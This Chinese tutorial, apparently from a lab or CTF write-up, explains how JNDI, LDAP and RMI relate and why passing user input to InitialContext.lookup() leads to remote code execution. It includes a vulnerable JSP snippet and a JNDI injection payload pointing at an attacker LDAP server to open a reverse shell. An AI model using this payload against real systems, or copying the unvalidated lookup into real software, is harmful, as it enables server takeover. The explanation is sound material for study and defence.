#### 一、JNDI / LDAP / RMI 关系图

```
[你的 Java 程序]
        |
        |  调用
        v
   InitialContext.lookup("某个名字")
        |
        |---- 如果这个名字是本地资源名
        |         例如：java:comp/env/jdbc/mydb
        |         -> 去应用服务器本地环境里找资源
        |
        |---- 如果这个名字是 ldap://...
        |         -> 通过 LDAP 协议去远程目录服务器查
        |
        |---- 如果这个名字是 rmi://...
                  -> 通过 RMI 机制去远程对象注册表查
```

所以：

- **JNDI** = “统一查名字”的接口
- **LDAP / RMI** = “JNDI 可以去问的外部来源”

你可以把它理解成：

```
JNDI = 查号台
LDAP = 通讯录服务器
RMI  = 远程对象登记处
```

------

#### 二、三者各自是什么

```
JNDI
  = Java 统一命名/目录查找接口
  = 负责“按名字找东西”

LDAP
  = 一种目录服务协议
  = 常用来存用户、组织、账号信息
  = 像“企业通讯录/账号目录”

RMI
  = Java 远程方法调用
  = 用来找远程 Java 对象并调用它的方法
  = 像“远程对象电话”
```

------

#### 三、正常情况下它们怎么配合

例如程序里写：

```
Context ctx = new InitialContext();
Object obj = ctx.lookup("ldap://server/xxx");
```

逻辑就是：

```
程序
 -> 让 JNDI 去 lookup("ldap://server/xxx")
 -> JNDI 发现这是 ldap://
 -> 于是去 LDAP 服务器查询
 -> 把查询结果返回给程序
```

如果是：

```
ctx.lookup("rmi://server/obj")
```

那就是：

```
程序
 -> 让 JNDI 去 lookup("rmi://server/obj")
 -> JNDI 发现这是 rmi://
 -> 于是去 RMI 注册表找远程对象
 -> 把对象/引用返回给程序
```

#### 四、这题里的真实关系图

你的 JSP 关键代码是：

```
String input = request.getParameter("jndi_name");
Context ctx = new InitialContext();
Object obj = ctx.lookup(input);
```

也就是：

```
[浏览器 / curl]
        |
        |  POST jndi_name=ldap://192.168.39.142:1389/Basic/ReverseShell/...
        v
[jndi.jsp]
        |
        |  直接把用户输入交给
        v
[ctx.lookup(input)]
        |
        |  发现是 ldap://...
        v
[去连接你的 LDAP 服务器 192.168.39.142:1389]
```

------

#### 五、为什么会变成 RCE

危险点就在这里：

```
本来程序员以为：
lookup() 只是“查一个资源”

实际上某些老环境里：
lookup() 可能会“按返回内容继续构造对象 / 加载类 / 调用工厂”
```

所以你的利用链变成：

```s
你控制 jndi_name
        |
        v
目标服务器去访问你控制的 LDAP
        |
        v
你的 LDAP 不返回普通数据
而是返回“恶意引用 / 恶意对象说明”
        |
        v
目标 JVM / Tomcat 继续解析这个引用
        |
        +---- 方案A：去你的 HTTP 下载恶意 .class
        |
        +---- 方案B：调用目标本地已有危险类链（TomcatBypass / ELProcessor）
        |
        v
命令执行 / 反弹 shell
```
